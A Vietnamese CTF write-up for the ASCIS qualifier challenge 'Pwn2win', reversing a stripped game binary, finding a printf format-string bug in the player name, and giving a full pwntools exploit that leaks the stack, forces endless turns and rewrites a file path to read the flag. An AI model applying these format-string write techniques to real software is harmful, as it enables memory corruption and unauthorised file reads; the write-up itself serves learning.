---
layout: post
title: ASCIS quals - Pwn2win
tags: [pwn]
categories: CTF Writeups
---


> Kì thi Sinh viên với An Toàn Thông Tin vòng sơ khảo vừa kết thúc, một kì thi khủng bố với các bài pwn không dành cho người thiếu Oxy :D

> Kì thi lần này gồm 3 bài pwn (proxy, pwn2win & image converter). Sau hơn nửa ngày vò đầu bức óc thì mình (niche) giải được bài 1 bài là _Pwn2win_.
 Mình xin dành một bài post để viết sương sương lại chiếc WriteUp mà mình đã tốn khá nhiều thời gian cho nó.

> Mình xin tạm chia bài post thành các phần sau:
- [Dịch ngược code](#reversing)
- [Tìm lỗi](#vulnerability)
- [Lên ý tưởng để giải quyết vấn đề](#ideas)
- [Bem nó](#exploitation)


## <a id="reversing"></a> Dịch ngược code

File binary được cho (kimetsu_no_yaiba) là một file 64-bit ELF đã stripped để che đi các hàm, đầu tiên mình kiểm tra bằng lệnh checksec để xem bài này có những hạn chế gì:
~~~
gef➤  checksec
[+] checksec for '/mnt/hgfs/data/ascis/pwn2win/kimetsu_no_yaiba'
Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
~~~

PIE bit đã tắt (no ASLR on executing code) và RelRO được bật Partial, nghĩa là ta có thể chỉnh sửa một phần của file.
(ﾉ´ з `)ノ

Sau khi chạy thử thì mình thấy file binary này mô phỏng một trò chơi, luật chơi khá dễ và chúng ta cần giết quái vật để dành chiến thắng.
Vì BTC không cung cấp thêm các file về chỉ số quái vật nên ban đầu file sẽ không chạy, vì vậy mình đã connect với server để tạo file mới có thông tin về quái vật tương tự với server.

Mở lại file bằng ghidra và decompile hàm main:
```clike
void main(void)

{
  long in_FS_OFFSET;
  char local_81;
  int local_80;
  int local_7c;
  int local_78;
  int local_74;
  FILE *local_70;
  char local_68 [48];
  char local_38 [40];
  undefined8 local_10;

  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_80 = 0;
  local_7c = 1;
  init();
  memset(local_68,0,0x30);
  memset(&DAT_00602100,0,0x30);
  puts("=====================================================================");
  puts(&DAT_004016c0);
  puts(&DAT_00401718);
  read_boss(&DAT_00602100,s_./boss_00602098 + local_7c * 7);
  read_name(local_68);
  for (local_78 = 0; local_78 < 3; local_78 = local_78 + 1) {
    local_74 = start_game(local_68);
    if (local_74 == 1) {
      printf("WINNER: ");
      printf(local_68);
      puts(&DAT_00401788);
      if (local_7c == 1) {
        printf(&DAT_004017b8);
      }
      else {
        if (local_7c == 0) {
          printf(&DAT_00401810);
        }
        else {
          printf(&DAT_00401868);
        }
      }
      __isoc99_scanf(&DAT_004018a7,&local_81);
      getchar();
      if (local_81 == 'y') {
        if (local_7c != 2) {
          local_7c = local_7c + 1;
          memset(&DAT_00602100,0,0x30);
          read_boss(&DAT_00602100,s_./boss_00602098 + local_7c * 7);
        }
        memset(local_68,0,0x30);
        read_name(local_68);
      }
      else {
        puts(&DAT_004018ab);
        FUN_00400ba8(local_68);
      }
      local_80 = local_80 + 1;
    }
    else {
      puts(&DAT_004018c8);
      printf(&DAT_004018e0);
      __isoc99_scanf(&DAT_004018a7,&local_81);
      getchar();
      if (local_81 == 'y') {
        local_7c = 0;
        memset(local_68,0,0x30);
        memset(&DAT_00602100,0,0x30);
        read_boss(&DAT_00602100,s_./boss_00602098);
        read_name(local_68);
      }
      else {
        puts(&DAT_004018ab);
        FUN_00400ba8(local_68);
      }
    }
    if (2 < local_78 + 1) {
      puts(&DAT_00401930);
    }
  }
  if (2 < local_80) {
    puts(&DAT_00401973);
    puts(&DAT_00401990);
    local_70 = fopen("./hint.txt","r");
    fread(local_38,0x1e,1,local_70);
    puts(local_38);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts(&DAT_004019db);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
Đại khái trò chơi sẽ đọc vào thông tin của boss từ một file bên ngoài và đọc vào tên của người chơi.
Trò chơi được lặp lại 3 lần, và nếu thắng hoặc thua người chơi sẽ chọn chơi tiếp hoặc thoát game.

Hàm điều khiển chính của trò chơi (đã được mình rename lại thành start_game()):
```clike
bool start_game(long param_1)

{
  long in_FS_OFFSET;
  bool bVar1;
  long in_stack_00000018;
  uint uStack0000000000000020;
  undefined8 in_stack_00000020;
  uint uStack0000000000000024;
  int local_24;
  uint strength;
  uint defend;
  int local_18;
  int local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0;
  local_14 = 0;
  puts(&DAT_00401410);
  while( true ) {
    if ((*(long *)(param_1 + 0x10) < 1) || (in_stack_00000018 < 1)) goto LAB_00400ec8;
    strength = *(uint *)(param_1 + 0x18);
    defend = *(uint *)(param_1 + 0x1c);
    puts("================================");
    puts(&DAT_00401469);
    puts(&DAT_0040147d);
    printf("> ");
    __isoc99_scanf(&%d,&local_24);
    if (local_24 == 1) {
      if (uStack0000000000000024 < strength) {
        in_stack_00000018 = in_stack_00000018 - (ulong)(strength - uStack0000000000000024);
      }
      else {
        puts(&khong_sat_thuong);
      }
    }
    else {
      __isoc99_scanf(&%d,&strength);
      if (strength < 0x11111112) {
        if (uStack0000000000000024 < strength) {
          printf(&DAT_004014ed);
          printf("%s Ichi no kata: Minamo giri\n\n",param_1 + 0x20);
          in_stack_00000018 = in_stack_00000018 - (ulong)(strength - uStack0000000000000024);
          defend = defend + (strength >> 1);
        }
        else {
          puts(&khong_sat_thuong);
        }
      }
      else {
        puts(&kynang_ko_du);
      }
    }
    if (in_stack_00000018 < 0) break;
    if ((in_stack_00000018 < 100000) && (local_14 == 0)) {
      puts(&DAT_00401558);
      local_14 = 1;
      uStack0000000000000020 = uStack0000000000000020 * 3;
      uStack0000000000000024 = uStack0000000000000024 * 2;
    }
    if (local_14 == 0) {
      if (local_18 < 3) {
        if (defend < uStack0000000000000020) {
          printf("Boss: \"%s\"\n",&stack0x00000028);
          *(ulong *)(param_1 + 0x10) =
               *(long *)(param_1 + 0x10) - (ulong)(uStack0000000000000020 - defend);
          local_18 = local_18 + 1;
        }
        else {
          puts(&DAT_00401588);
        }
      }
      else {
        if (defend < uStack0000000000000020 * 2) {
          printf("Boss: \"%s\"\n",&stack0x00000028);
          *(ulong *)(param_1 + 0x10) =
               *(long *)(param_1 + 0x10) - (ulong)(uStack0000000000000020 * 2 - defend);
          local_18 = 0;
        }
        else {
          puts(&DAT_004015b3);
        }
      }
    }
    else {
      if (defend < uStack0000000000000020) {
        printf("Boss: \"%s\"\n",&stack0x00000028);
        *(ulong *)(param_1 + 0x10) =
             *(long *)(param_1 + 0x10) - (ulong)(uStack0000000000000020 - defend);
      }
      else {
        puts(&DAT_004015d0);
      }
    }
    puts("================================");
    printf(&DAT_00401600,in_stack_00000018);
    printf(&DAT_00401611,*(undefined8 *)(param_1 + 0x10));
  }
  puts(&DAT_00401528);
LAB_00400ec8:
  bVar1 = -1 < *(long *)(param_1 + 0x10);
  if (!bVar1) {
    puts(&lose);
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return bVar1;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
Flow của trò chơi khá đơn giản: Người chơi được quyền sử dụng đánh thường hoặc Skill.
Nếu người chơi sử dụng Skill thì phải nhập một giá trị < 0x11111112 và nếu giá trị này lớn hơn chỉ số của boss thì boss sẽ mất máu.

Vì trò chơi không phải impossible to win nên ta chỉ cần nhập max value cho Skill (0x11111111) và sử dụng nhiều lần thì boss sẽ chết ◕‿◕.

## <a id="vulnerability"></a> Tìm lỗi

Sau khi dịch ngược được đoạn code thì ta dễ dàng nhận thấy lỗi của file binary này nằm ở xử lí sau khi người chơi dành chiến thắng:
```clike
    if (local_74 == 1) {
      printf("WINNER: ");
      printf(local_68);   <----------
      puts(&DAT_00401788);
      if (local_7c == 1) {
```
Một lỗi format string đơn giản, biến **local_68** chính là tên của người chơi. Tuy nhiên, chương trình chỉ cho phép nhận vào tối đa 16 ký tự cho biến này, nghĩa là ta cần phải tận dụng lỗi này để dành chiến thắng trong vòng 3 lượt chơi ?

## <a id="ideas"></a> Lên ý tưởng để giải quyết vấn đề

Với những bài format string thì điều đầu tiên ta cần làm là leak stack để tìm được offset mà nơi input người dùng nhập vào được lưu, từ đó có thể abritary write.
### Một điều quan trọng cần lưu ý trước khi làm bài này là ta cần sử dụng một libc gần với server nhất để đảm bảo không xảy ra trường hợp chỉ pwn được ở local :D Vì các bài tập khác server đều sử dụng glibc 2.31 nên mình cũng sẽ sử dụng nó cho binary này



Vì mục tiêu là đọc được file flag, vì vậy ta có thể tận dụng hàm read_boss để read file "flag":

```clike
void read_boss(long param_1,char *param_2)

{
  FILE *__stream;

  __stream = fopen(param_2,"r");
  if (__stream == (FILE *)0x0) {
    puts(&DAT_00401310);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __isoc99_fscanf(__stream,&DAT_00401355,param_1);
  __isoc99_fscanf(__stream,&DAT_00401358,param_1 + 0x10);
  __isoc99_fscanf(__stream,&DAT_0040135d,param_1 + 0x18);
  __isoc99_fscanf(__stream,&DAT_0040135d,param_1 + 0x1c);
  __isoc99_fscanf(__stream,&DAT_00401355,param_1 + 0x20);
  fclose(__stream);
  puts("\n=========INFO BOSS=========\n");
  printf("Name: %s\n",param_1);
  printf("Health: %lld\n",*(undefined8 *)(param_1 + 0x10));
  printf("Strength: %u\n",(ulong)*(uint *)(param_1 + 0x18));
  printf("Defend: %u\n",(ulong)*(uint *)(param_1 + 0x1c));
  printf("Skill: %s\n",param_1 + 0x20);
  puts("\n===========================\n");
  return;
}
```
Nhận thấy lúc truyền vào tham số cho hàm này, chương trình truyền vào một chuỗi được lưu ở địa chỉ 0x602098 cộng thêm với offset cho từng stage (tổng cộng có 3 chuỗi cách nhau 7 bytes), **_và chuỗi này có quyền write_**.
Vì vậy nếu ta tận dụng format string để chỉnh sửa chuỗi này, ta có thể đọc được file "flag" thông qua hàm read_boss.

Sau khi leak stack, mình nhận thấy buffer lưu tên người chơi nằm ở offset 10, nghĩa là ta có thể write tùy ý vào chương trình.
Tuy nhiên, vì giới hạn 16 bytes nên nếu ta mất 8 bytes để **pack64 địa chỉ** thì ta chỉ còn lại 8 bytes.
Vậy max giá trị ta có thể ghi được vào 1 địa chỉ bất kì là 0x9 **_(payload: "%9c%11$n"+p64(address))**_.
Nghĩa là ta không thể ghi từng giá trị của chuỗi "flag" được. Tuy nhiên, ta có thể tận dụng cách này để khiến trò chơi lặp vô hạn.

##Stage 1:

Vì lúc leak mình nhận thấy mình có thể leak được giá trị của stack nên ta có thể overwrite giá trị trên stack, ở đây ta sẽ overwrite biến đếm vòng lặp của trò chơi thành 0 để khiến trò chơi lặp vô hạn:

```py
def leak_stack():
    name(b'..%p')
    #Boss 1 : x6
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    P.recvuntil(b'..')
    leak_stack = int(P.recvline().strip(),16)
    turn_stack = leak_stack+0x26b0      # 0x80
    print(hex(turn_stack))

def get_turn():
    P.sendlineafter(b'n)', b'y')
    name(b'%11$naaa' + p64(turn_stack))
    #Boss 2 : x8
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
```
##Stage 2:

Sau khi khiến trò chơi lặp vô hạn, việc còn lại ta cần làm chỉ là ghi đè chuỗi "flag" vào chương trình.
Chú ý là lúc khiến trò chơi lặp vô hạn, biến đếm Boss sẽ dừng ở 2 và không tiếp tục gọi hàm read_boss nữa, vì vậy ta cần overwrite lại biến này để đọc "flag" vào payload cuối cùng.

Tới đây mình nhận ra để tiết kiệm số byte cần dùng và ghi được một giá trị lớn, ta có thể tận dụng vào những giá trị ở trong stack.
Quan sát stack values, mình tìm được một pointer ở offset 20 trỏ đến một pointer khác ở offset 52. Vì vậy nếu ta tận dụng format string vào offset 20, ta có thể ghi địa chỉ của chuỗi cần chỉnh sửa vào offset 52, và tiếp tục format string vào offset 52 để ghi chuỗi "flag" vào địa chỉ đó.

## <a id="exploitation"></a> Bem nó

Script hoàn chỉnh:

```python
from pwn import *

####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True

LOCAL_BIN = './kimetsu_no_yaiba'

if LOCAL:
    P = process(LOCAL_BIN)

elif REMOTETTCP:
    P = remote('125.235.240.166', 33333)

##########################


##### FUNCTION ######
##########################

def name(name):
    P.sendafter(b': ', name)


def attack(page_index):
    P.sendlineafter(b'> ', b'1')


def skill(strength):
    P.sendlineafter(b'> ', b'2')
    P.sendline(str(strength).encode())


def leak_stack():
    name(b'..%p')
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    P.recvuntil(b'..')
    leak_stack = int(P.recvline().strip(), 16)
    return leak_stack


def get_turn():
    P.sendlineafter(b'n)', b'y')
    name(b'%11$naaa' + p64(turn_stack))
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)


def vuln(payload):
    P.sendlineafter(b'n)', b'y')
    name(payload)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)
    skill(0x11111111)


##############################
##### FINAL EXPLOITATION #####
##############################

leak_stack = leak_stack()
turn_stack = leak_stack + 0x26b0  # 0x80
get_turn()
# write 0x6020a8 to stack
vuln(b'%6299816c%20$n')
get_turn()

# write 'fl' to 0x6020a8
vuln(b'%27750c%52$n')
get_turn()

# write 0x6020b0 to stack
vuln(b'%6299818c%20$n')
get_turn()

# write 'ag' to 0x6020b0
vuln(b'%26465c%52$n')
get_turn()

# rewrite read_boss offset to read the right string
read_boss_stack = leak_stack + 0x26b0 - 0x4  # 0x80
vuln(b'a%11$naa' + p64(read_boss_stack))

P.interactive()

```


<center>~ THE END ~ </center>


